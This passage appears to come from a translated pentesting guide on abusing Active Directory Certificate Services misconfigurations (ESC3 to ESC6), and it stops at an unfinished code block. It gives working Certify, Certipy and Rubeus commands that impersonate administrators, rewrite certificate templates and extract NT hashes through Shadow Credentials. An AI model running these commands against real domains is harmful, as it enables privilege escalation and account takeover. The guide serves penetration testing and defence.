* –ë–µ–∑–ø–µ–∫–æ–≤–∏–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —à–∞–±–ª–æ–Ω—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ —î –Ω–∞–¥–º—ñ—Ä–Ω–æ –¥–æ–∑–≤–æ–ª—è—é—á–∏–º, –Ω–∞–¥–∞—é—á–∏ –ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.
* –®–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –≤–∫–ª—é—á–∞—î EKU –∞–≥–µ–Ω—Ç–∞ –∑–∞–ø–∏—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ —ñ–Ω—à—ñ —à–∞–±–ª–æ–Ω–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –≤—ñ–¥ —ñ–º–µ–Ω—ñ —ñ–Ω—à–∏—Ö —Å—É–±'—î–∫—Ç—ñ–≤.

**–í–∏–º–æ–≥–∏ 2:**

* Enterprise CA –Ω–∞–¥–∞—î –ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.
* –ó–∞—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞ –æ–±—Ö–æ–¥–∏—Ç—å—Å—è.
* –í–µ—Ä—Å—ñ—è —Å—Ö–µ–º–∏ —à–∞–±–ª–æ–Ω—É —î –∞–±–æ 1, –∞–±–æ –ø–µ—Ä–µ–≤–∏—â—É—î 2, —ñ –≤–æ–Ω–∞ –≤–∫–∞–∑—É—î –Ω–∞ –≤–∏–º–æ–≥—É –ø–æ–ª—ñ—Ç–∏–∫–∏ –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è, —è–∫–∞ –≤–∏–º–∞–≥–∞—î EKU –∞–≥–µ–Ω—Ç–∞ –∑–∞–ø–∏—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞.
* EKU, –≤–∏–∑–Ω–∞—á–µ–Ω–∏–π —É —à–∞–±–ª–æ–Ω—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞, –¥–æ–∑–≤–æ–ª—è—î –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –¥–æ–º–µ–Ω—É.
* –û–±–º–µ–∂–µ–Ω–Ω—è –¥–ª—è –∞–≥–µ–Ω—Ç—ñ–≤ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—Ç—å—Å—è –Ω–∞ CA.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**Certify**](https://github.com/GhostPack/Certify) –∞–±–æ [**Certipy**](https://github.com/ly4k/Certipy) –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ü–∏–º —Å—Ü–µ–Ω–∞—Ä—ñ—î–º:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**–ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ**, —è–∫–∏–º –¥–æ–∑–≤–æ–ª–µ–Ω–æ **–æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏** **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –∞–≥–µ–Ω—Ç–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó**, —à–∞–±–ª–æ–Ω–∏, –≤ —è–∫–∏—Ö –∞–≥–µ–Ω—Ç–∞–º —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –¥–æ–∑–≤–æ–ª–µ–Ω–æ —Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏—Å—è, —Ç–∞ **—Ä–∞—Ö—É–Ω–∫–∏**, –≤—ñ–¥ —ñ–º–µ–Ω—ñ —è–∫–∏—Ö –∞–≥–µ–Ω—Ç —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –º–æ–∂–µ –¥—ñ—è—Ç–∏, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –æ–±–º–µ–∂–µ–Ω—ñ –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–∏–º–∏ –¶–°. –¶–µ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è `certsrc.msc` **–¥–æ–¥–∞—Ç–∫—É**, **–∫–ª–∞—Ü–∞–Ω–Ω—è –ø—Ä–∞–≤–æ—é –∫–Ω–æ–ø–∫–æ—é –º–∏—à—ñ –Ω–∞ –¶–°**, **–≤–∏–±–æ—Ä—É –í–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ**, –∞ –ø–æ—Ç—ñ–º **–ø–µ—Ä–µ–º—ñ—â–µ–Ω–Ω—è** –Ω–∞ –≤–∫–ª–∞–¥–∫—É ‚Äú–ê–≥–µ–Ω—Ç–∏ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó‚Äù.

–û–¥–Ω–∞–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ, —â–æ **–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º** –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –¥–ª—è –¶–° –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± ‚Äú**–ù–µ –æ–±–º–µ–∂—É–≤–∞—Ç–∏ –∞–≥–µ–Ω—Ç—ñ–≤ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó**.‚Äù –ö–æ–ª–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–ª—è –∞–≥–µ–Ω—Ç—ñ–≤ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –∞–∫—Ç–∏–≤—É—î—Ç—å—Å—è –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º–∏, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –π–æ–≥–æ –Ω–∞ ‚Äú–û–±–º–µ–∂–∏—Ç–∏ –∞–≥–µ–Ω—Ç—ñ–≤ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó‚Äù –∑–∞–ª–∏—à–∞—î –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–∞–¥–∑–≤–∏—á–∞–π–Ω–æ –ª—ñ–±–µ—Ä–∞–ª—å–Ω–æ—é. –¶–µ –¥–æ–∑–≤–æ–ª—è—î **–£—Å—ñ–º** –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –≤ —É—Å—ñ—Ö —à–∞–±–ª–æ–Ω–∞—Ö —è–∫ –±—É–¥—å-—Ö—Ç–æ.

## –í—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É –¥–æ —à–∞–±–ª–æ–Ω—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ - ESC4

### **–ü–æ—è—Å–Ω–µ–Ω–Ω—è**

**–ë–µ–∑–ø–µ–∫–æ–≤–∏–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä** –Ω–∞ **—à–∞–±–ª–æ–Ω–∞—Ö —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤** –≤–∏–∑–Ω–∞—á–∞—î **–¥–æ–∑–≤–æ–ª–∏**, —è–∫—ñ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ **–ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∏ AD** –º–∞—é—Ç—å —â–æ–¥–æ —à–∞–±–ª–æ–Ω—É.

–Ø–∫—â–æ **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫** –º–∞—î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ **–¥–æ–∑–≤–æ–ª–∏** –¥–ª—è **–∑–º—ñ–Ω–∏** **—à–∞–±–ª–æ–Ω—É** —Ç–∞ **–≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è** –±—É–¥—å-—è–∫–∏—Ö **–µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω–∏—Ö –Ω–µ–∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π**, –æ–ø–∏—Å–∞–Ω–∏—Ö —É **–ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö —Ä–æ–∑–¥—ñ–ª–∞—Ö**, –º–æ–∂–µ –±—É—Ç–∏ –ø–æ–ª–µ–≥—à–µ–Ω–æ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.

–ó–Ω–∞—á–Ω—ñ –¥–æ–∑–≤–æ–ª–∏, —â–æ –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—Ç—å—Å—è –¥–æ —à–∞–±–ª–æ–Ω—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤, –≤–∫–ª—é—á–∞—é—Ç—å:

* **–í–ª–∞—Å–Ω–∏–∫:** –ù–∞–¥–∞—î –Ω–µ—è–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –æ–±'—î–∫—Ç–æ–º, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –±—É–¥—å-—è–∫—ñ –∞—Ç—Ä–∏–±—É—Ç–∏.
* **–ü–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å:** –î–æ–∑–≤–æ–ª—è—î –ø–æ–≤–Ω—É –≤–ª–∞–¥—É –Ω–∞–¥ –æ–±'—î–∫—Ç–æ–º, –≤–∫–ª—é—á–∞—é—á–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –±—É–¥—å-—è–∫—ñ –∞—Ç—Ä–∏–±—É—Ç–∏.
* **–ó–º—ñ–Ω–∏—Ç–∏ –≤–ª–∞—Å–Ω–∏–∫–∞:** –î–æ–∑–≤–æ–ª—è—î –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –≤–ª–∞—Å–Ω–∏–∫–∞ –æ–±'—î–∫—Ç–∞ –Ω–∞ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∞ –ø—ñ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞.
* **–ó–º—ñ–Ω–∏—Ç–∏ DACL:** –î–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏–≥—É–≤–∞—Ç–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É, –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –Ω–∞–¥–∞—é—á–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –ü–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å.
* **–ó–º—ñ–Ω–∏—Ç–∏ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å:** –î–æ–∑–≤–æ–ª—è—î —Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ –æ–±'—î–∫—Ç–∞.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–ü—Ä–∏–∫–ª–∞–¥ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, —è–∫ —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É:

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 - —Ü–µ –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–∞—î –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å –Ω–∞–¥ —à–∞–±–ª–æ–Ω–æ–º —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞. –¶–µ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –º–æ–∂–µ –±—É—Ç–∏ –∑–ª–æ–≤–∂–∏—Ç–æ –¥–ª—è –ø–µ—Ä–µ–ø–∏—Å—É–≤–∞–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —à–∞–±–ª–æ–Ω–∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ —à–∞–±–ª–æ–Ω –≤—Ä–∞–∑–ª–∏–≤–∏–º –¥–æ ESC1.

–Ø–∫ –º–∏ –±–∞—á–∏–º–æ –Ω–∞ –Ω–∞–≤–µ–¥–µ–Ω–æ–º—É –≤–∏—â–µ —à–ª—è—Ö—É, –ª–∏—à–µ `JOHNPC` –º–∞—î —Ü—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó, –∞–ª–µ –Ω–∞—à –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á `JOHN` –º–∞—î –Ω–æ–≤–∏–π `AddKeyCredentialLink` –¥–æ `JOHNPC`. –û—Å–∫—ñ–ª—å–∫–∏ —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –ø–æ–≤'—è–∑–∞–Ω–∞ –∑ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞–º–∏, —è —Ç–∞–∫–æ–∂ —Ä–µ–∞–ª—ñ–∑—É–≤–∞–≤ —Ü—é –∞—Ç–∞–∫—É, —è–∫–∞ –≤—ñ–¥–æ–º–∞ —è–∫ [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). –û—Å—å –Ω–µ–≤–µ–ª–∏–∫–∏–π –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –ø–µ—Ä–µ–≥–ª—è–¥ –∫–æ–º–∞–Ω–¥–∏ `shadow auto` Certipy –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è NT —Ö–µ—à—É –∂–µ—Ä—Ç–≤–∏.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** –º–æ–∂–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —à–∞–±–ª–æ–Ω—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –æ–¥–Ω–∏–º –∫–æ–º–∞–Ω–¥–æ—é. –ó–∞ **–∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**, Certipy **–ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î** –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ —ó—ó **–≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–æ ESC1**. –ú–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ–º–æ –≤–∫–∞–∑–∞—Ç–∏ **`-save-old` –ø–∞—Ä–∞–º–µ—Ç—Ä –¥–ª—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —Å—Ç–∞—Ä–æ—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó**, —â–æ –±—É–¥–µ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è **–≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è** –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –ø—ñ—Å–ª—è –Ω–∞—à–æ—ó –∞—Ç–∞–∫–∏.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## –í—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É –¥–æ –æ–±'—î–∫—Ç—ñ–≤ PKI - ESC5

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–®–∏—Ä–æ–∫–∞ –º–µ—Ä–µ–∂–∞ –≤–∑–∞—î–º–æ–ø–æ–≤'—è–∑–∞–Ω–∏—Ö –≤—ñ–¥–Ω–æ—Å–∏–Ω –Ω–∞ –æ—Å–Ω–æ–≤—ñ ACL, —è–∫–∞ –≤–∫–ª—é—á–∞—î –∫—ñ–ª—å–∫–∞ –æ–±'—î–∫—Ç—ñ–≤, –∫—Ä—ñ–º —à–∞–±–ª–æ–Ω—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ —ñ —Ü–µ–Ω—Ç—Ä—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –º–æ–∂–µ –≤–ø–ª–∏–Ω—É—Ç–∏ –Ω–∞ –±–µ–∑–ø–µ–∫—É –≤—Å—ñ—î—ó —Å–∏—Å—Ç–µ–º–∏ AD CS. –¶—ñ –æ–±'—î–∫—Ç–∏, —è–∫—ñ –º–æ–∂—É—Ç—å —Å—É—Ç—Ç—î–≤–æ –≤–ø–ª–∏–Ω—É—Ç–∏ –Ω–∞ –±–µ–∑–ø–µ–∫—É, –æ—Ö–æ–ø–ª—é—é—Ç—å:

* –û–±'—î–∫—Ç –∫–æ–º–ø'—é—Ç–µ—Ä–∞ AD —Å–µ—Ä–≤–µ—Ä–∞ CA, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π —á–µ—Ä–µ–∑ –º–µ—Ö–∞–Ω—ñ–∑–º–∏, —Ç–∞–∫—ñ —è–∫ S4U2Self –∞–±–æ S4U2Proxy.
* RPC/DCOM —Å–µ—Ä–≤–µ—Ä —Å–µ—Ä–≤–µ—Ä–∞ CA.
* –ë—É–¥—å-—è–∫–∏–π –Ω–∞—â–∞–¥–æ–∫ –æ–±'—î–∫—Ç–∞ AD –∞–±–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –≤ –º–µ–∂–∞—Ö –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —à–ª—è—Ö—É –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. –¶–µ–π —à–ª—è—Ö –≤–∫–ª—é—á–∞—î, –∞–ª–µ –Ω–µ –æ–±–º–µ–∂—É—î—Ç—å—Å—è, –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞–º–∏ —Ç–∞ –æ–±'—î–∫—Ç–∞–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä —à–∞–±–ª–æ–Ω—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤, –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä —Ü–µ–Ω—Ç—Ä—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –æ–±'—î–∫—Ç NTAuthCertificates —Ç–∞ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –ø–æ—Å–ª—É–≥ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó.

–ë–µ–∑–ø–µ–∫–∞ —Å–∏—Å—Ç–µ–º–∏ PKI –º–æ–∂–µ –±—É—Ç–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∞, —è–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –∑–º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –±—É–¥—å-—è–∫–∏–º –∑ —Ü–∏—Ö –∫—Ä–∏—Ç–∏—á–Ω–∏—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ñ–≤.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–¢–µ–º–∞, –æ–±–≥–æ–≤–æ—Ä–µ–Ω–∞ –≤ [**–ø–æ—Å—Ç—ñ CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), —Ç–∞–∫–æ–∂ —Ç–æ—Ä–∫–∞—î—Ç—å—Å—è –Ω–∞—Å–ª—ñ–¥–∫—ñ–≤ –ø—Ä–∞–ø–æ—Ä–∞ **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, —è–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ Microsoft. –¶—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è, –∫–æ–ª–∏ –≤–æ–Ω–∞ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∞ –Ω–∞ –¶–µ–Ω—Ç—Ä—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó (CA), –¥–æ–∑–≤–æ–ª—è—î –≤–∫–ª—é—á–∞—Ç–∏ **–∑–Ω–∞—á–µ–Ω–Ω—è, –≤–∏–∑–Ω–∞—á–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**, —É **–¥–æ–¥–∞—Ç–∫–æ–≤—É –Ω–∞–∑–≤—É —Å—É–±'—î–∫—Ç–∞** –¥–ª—è **–±—É–¥—å-—è–∫–æ–≥–æ –∑–∞–ø–∏—Ç—É**, –≤–∫–ª—é—á–∞—é—á–∏ —Ç—ñ, —â–æ —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∑ Active Directory¬Æ. –í–Ω–∞—Å–ª—ñ–¥–æ–∫ —Ü—å–æ–≥–æ, —Ü—è –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –¥–æ–∑–≤–æ–ª—è—î **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É** –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ **–±—É–¥—å-—è–∫–∏–π —à–∞–±–ª–æ–Ω**, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –¥–ª—è **–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** –¥–æ–º–µ–Ω—É ‚Äî –∑–æ–∫—Ä–µ–º–∞, —Ç—ñ, —â–æ –≤—ñ–¥–∫—Ä–∏—Ç—ñ –¥–ª—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó **–Ω–µ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–º–∏** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏, —è–∫ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–π —à–∞–±–ª–æ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ, —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –º–æ–∂–µ –±—É—Ç–∏ –æ—Ç—Ä–∏–º–∞–Ω–∏–π, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è —è–∫ –¥–æ–º–µ–Ω–Ω–∏–π –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –∞–±–æ **–±—É–¥—å-—è–∫–∞ —ñ–Ω—à–∞ –∞–∫—Ç–∏–≤–Ω–∞ —Å—É—Ç–Ω—ñ—Å—Ç—å** –≤ –º–µ–∂–∞—Ö –¥–æ–º–µ–Ω—É.

**–ü—Ä–∏–º—ñ—Ç–∫–∞**: –ü—ñ–¥—Ö—ñ–¥ –¥–æ –¥–æ–¥–∞–≤–∞–Ω–Ω—è **–¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö —ñ–º–µ–Ω** —É –ó–∞–ø–∏—Ç –Ω–∞ –ø—ñ–¥–ø–∏—Å —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ (CSR) —á–µ—Ä–µ–∑ –∞—Ä–≥—É–º–µ–Ω—Ç `-attrib "SAN:"` —É `certreq.exe` (—è–∫–∏–π –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è ‚Äú–ü–∞—Ä–∏ –∑–Ω–∞—á–µ–Ω–Ω—è —ñ–º–µ–Ω‚Äù) –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î **–∫–æ–Ω—Ç—Ä–∞—Å—Ç** –∑ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ–π–Ω–æ—é —Å—Ç—Ä–∞—Ç–µ–≥—ñ—î—é SAN —É ESC1. –¢—É—Ç –≤—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –ø–æ–ª—è–≥–∞—î –≤ **—Ç–æ–º—É, —è–∫ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —ñ–Ω–∫–∞–ø—Å—É–ª—å–æ–≤–∞–Ω–∞** ‚Äî –≤ –∞—Ç—Ä–∏–±—É—Ç—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞, –∞ –Ω–µ –≤ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—ñ.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–©–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è, –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É –∑ `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
–¶—è –æ–ø–µ—Ä–∞—Ü—ñ—è –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–¥–æ—Å—Ç—É–ø –¥–æ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ —Ä–µ—î—Å—Ç—Ä—É**, –æ—Ç–∂–µ, –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–π –ø—ñ–¥—Ö—ñ–¥ –º–æ–∂–µ –±—É—Ç–∏:
```bash
